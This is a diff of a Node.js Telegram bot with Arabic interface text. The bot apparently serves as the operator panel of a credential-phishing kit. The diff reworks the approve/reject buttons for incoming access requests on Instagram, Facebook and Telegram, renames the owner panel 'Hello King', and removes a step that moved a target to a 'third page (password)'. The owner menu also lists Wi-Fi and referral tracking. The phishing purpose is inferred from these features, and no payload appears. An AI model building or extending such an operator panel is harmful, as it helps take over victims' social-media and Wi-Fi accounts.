@@ -428,28 +428,13 @@ app.post("/api/request-access", async (req, res) => {
             );
         });
 
-        let buttons = [];
-        if (app === "instagram" || app === "facebook") {
-            buttons = [
-                [
-                    { text: "✅ قبول", callback_data: `approve:${requestId}` },
-                    { text: "❌ رفض", callback_data: `reject:${requestId}` }
-                ]
-            ];
-        } else if (app === "telegram") {
-            buttons = [
-                [{ text: "✅ قبول", callback_data: `approve:${requestId}` }],
-                [{ text: "❌ رفض", callback_data: `reject:${requestId}` }],
-                [{ text: "🔑 الصفحة الثالثة", callback_data: `third_page:${requestId}` }]
-            ];
-        } else {
-            buttons = [
-                [
-                    { text: "✅ قبول", callback_data: `approve:${requestId}` },
-                    { text: "❌ رفض", callback_data: `reject:${requestId}` }
-                ]
-            ];
-        }
+        // ✅ جميع التطبيقات زرين فقط
+        let buttons = [
+            [
+                { text: "✅ قبول", callback_data: `approve:${requestId}` },
+                { text: "❌ رفض", callback_data: `reject:${requestId}` }
+            ]
+        ];
 
         await bot.sendMessage(
             telegramId,
@@ -539,12 +524,10 @@ function sendOwnerMenu(chatId) {
         ]
     ];
 
-    // ✅ زر إظهار/إخفاء الأزرار
     if (showButtons) {
         buttons.push([
             { text: "🙈 إخفاء الأزرار", callback_data: "hide_buttons" }
         ]);
-        // ✅ الأزرار الخاصة بالخدمات (تظهر فقط عند الضغط على إظهار الأزرار)
         buttons.push([
             { text: "📸 Instagram", callback_data: "instagram" },
             { text: "📘 Facebook", callback_data: "facebook" }
@@ -556,7 +539,6 @@ function sendOwnerMenu(chatId) {
         buttons.push([
             { text: "📶 Wi-Fi", callback_data: "wifi" }
         ]);
-        // ✅ زر عرض الـ REF
         buttons.push([
             { text: "🔗 عرض الـ REF", callback_data: "show_refs" }
         ]);
@@ -569,10 +551,11 @@ function sendOwnerMenu(chatId) {
     return bot.sendMessage(
         chatId,
         `🖥️ *┌─────────────────────┐*
-│   👑 𝕆𝕎ℕ𝔼ℝ ℙ𝔸ℕ𝔼𝕃  │
+│   👑 ℍ𝔼𝕃𝕃𝕆 𝕂𝕀ℕ𝔾    │
 └─────────────────────┘
 
-👋 مرحباً بك أيها السيد ${OWNER_NAME}
+👋 أهلاً بالسيد ${OWNER_NAME}
+👑 Hello King ${OWNER_NAME}
 
 📌 كيف يمكنني مساعدتك؟
 
@@ -796,21 +779,18 @@ bot.on("callback_query", async (query) => {
 
         if (String(chatId) === OWNER_ID) {
 
-            // ✅ إظهار الأزرار
             if (data === "show_buttons") {
                 showButtons = true;
                 await bot.answerCallbackQuery(query.id, { text: "✅ تم إظهار الأزرار" });
                 return sendOwnerMenu(chatId);
             }
 
-            // ✅ إخفاء الأزرار
             if (data === "hide_buttons") {
                 showButtons = false;
                 await bot.answerCallbackQuery(query.id, { text: "🙈 تم إخفاء الأزرار" });
                 return sendOwnerMenu(chatId);
             }
 
-            // ✅ عرض الـ REF
             if (data === "show_refs") {
                 const refs = await getAllReferrals(chatId);
 
@@ -899,9 +879,6 @@ bot.on("callback_query", async (query) => {
                 });
                 return sendOwnerMenu(chatId);
             }
-
-            // ✅ إذا ضغط على خدمات من قائمة المالك (Instagram, Facebook, Telegram, etc.)
-            // نسمح له باستخدامها
         }
 
         // =================================================
@@ -948,25 +925,6 @@ bot.on("callback_query", async (query) => {
 └─────────────────────┘
 
 ❌ تم رفض طلب التواصل`,
-                {
-                    chat_id: chatId,
-                    message_id: query.message.message_id,
-                    parse_mode: 'Markdown'
-                }
-            );
-            return;
-        }
-
-        if (data.startsWith("third_page:")) {
-            const requestId = data.split(":")[1];
-            await updateRequestStatus(requestId, "third_page");
-            await bot.answerCallbackQuery(query.id, { text: "🔑 تم الانتقال للصفحة الثالثة" });
-            await bot.editMessageText(
-                `🖥️ *┌─────────────────────┐*
-│   🔑 𝕋ℍ𝕀ℝ𝔻 ℙ𝔸𝔾𝔼  │
-└─────────────────────┘
-
-🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,
                 {
                     chat_id: chatId,
                     message_id: query.message.message_id,
